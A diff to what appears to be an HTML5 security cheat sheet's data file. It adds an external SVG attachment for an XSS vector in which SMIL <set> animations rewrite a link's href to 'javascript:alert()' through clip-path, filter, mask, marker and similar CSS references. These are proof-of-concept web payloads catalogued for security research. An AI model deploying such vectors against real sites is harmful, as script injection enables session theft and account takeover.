@@ -3354,7 +3354,13 @@ var items =
             'de' : ''
         },
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<a id="x"><rect fill="white" width="1000" height="1000"/></a>\n<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>\n</svg>',
-
+        'attachment' : {
+            'required_mime' : 'image/svg+xml',
+            'samedomain'    : '0',            
+            'path'          : 'http://heideri.ch/jso/test3.svg',
+            'name'          : 'test3.svg',
+            'raw'           : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n\n<clipPath id="a" >\n<set xlink:href="#x" attributeName="xlink:href" begin="1s" to="javascript:alert(1)" />\n</clipPath>\n\n<pattern id="b">\n<set xlink:href="#x" attributeName="xlink:href" begin="2s" to="javascript:alert(2)" />\n</pattern>\n\n<filter id="c">\n<set xlink:href="#x" attributeName="xlink:href" begin="3s" to="javascript:alert(3)" />\n</filter>\n\n<marker id="d">\n<set xlink:href="#x" attributeName="xlink:href" begin="4s" to="javascript:alert(4)" />\n</marker>\n\n<mask id="e">\n<set xlink:href="#x" attributeName="xlink:href" begin="5s" to="javascript:alert(5)" />\n</mask>\n\n<linearGradient id="f">\n<set xlink:href="#x" attributeName="xlink:href" begin="6s" to="javascript:alert(6)" />\n</linearGradient>\n\n</svg>'
+        },
         'description': {
             'en' : 'SVG supports several new CSS properties (clip-path, fill, filter, marker, marker-end, marker-mid, marker-start, mask, stroke), which can refer to external SVG-resources. These properties can also act as separate attributes. Within the external SVG can contain information to animate the current SVG-document. Example shows an animation links, but the possibilities of animation and other elements. Note that Opera does not show the user the change of links address, if the cursor does not go beyond it.',
             'ja' : '',
